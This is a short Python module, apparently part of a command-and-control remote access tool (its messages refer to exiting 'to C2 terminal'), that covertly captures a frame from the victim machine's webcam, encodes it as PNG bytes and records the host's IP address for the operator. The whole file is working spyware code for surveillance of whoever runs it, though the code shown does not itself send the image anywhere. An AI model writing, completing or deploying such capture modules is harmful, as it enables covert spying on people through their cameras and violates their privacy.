import time
import cv2
from PIL import Image
import io
import socket
import sys

class Webcam:
    def __init__(self):
        self.CURRENT = [None, self._get_client_info()]
        self.SC_DATA = b""
        self.SUCCESS = False
        self.SC_DATA = self.capture()

    def _get_client_info(self):
        class DummyClient:
            def __init__(self):
                self.ip = self.get_ip()
            def get_ip(self):
                try:
                    return socket.gethostbyname(socket.gethostname())
                except:
                    return "0.0.0.0"
        return DummyClient()

    def capture(self):
        try:
            cam = cv2.VideoCapture(0)
            start_time = time.time()
            while not cam.isOpened():
                if time.time() - start_time > 7:
                    print("[-] Webcam not detected within 7 seconds. Exiting to C2 terminal.")
                    sys.exit(0)  
                time.sleep(0.5)  

            ret, frame = cam.read()
            cam.release()
            if not ret:
                return "Webcam capture failed"

            frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            img = Image.fromarray(frame_rgb)
            buffer = io.BytesIO()
            img.save(buffer, format='PNG')
            return buffer.getvalue()
        except Exception as e:
            print(f"[-] Webcam error: {e}")
            sys.exit(0)  
